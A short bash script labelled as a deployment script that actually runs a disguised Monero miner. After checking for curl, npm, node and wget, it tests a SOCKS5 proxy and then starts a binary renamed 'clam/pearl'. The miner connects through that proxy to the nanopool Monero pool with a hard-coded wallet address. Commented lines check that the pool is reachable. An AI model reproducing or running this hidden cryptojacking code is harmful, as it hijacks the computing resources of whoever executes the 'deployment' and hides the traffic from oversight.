#!/bin/bash

echo "Deployment script started"
# cat /etc/os-release
which curl
which npm 
which node
which wget
# whoami 
#clam/pearl --version
curl --socks5 199.116.112.6:4145 ipinfo.io
timeout 120 clam/pearl -x 199.116.112.6:4145 -o xmr-eu1.nanopool.org:14433 -u 41gaYmwQbHV9DHEhfqE9YGMnYXc8fXov63MfHrJwSETL3RJsuYaM
g8f6sTAkNxvjSiGuw1qCfYFE515ogxU171wYH5RnkJJ --coin monero
#curl 18.196.88.146:14433
#ping -c 1 xmr-eu1.nanopool.org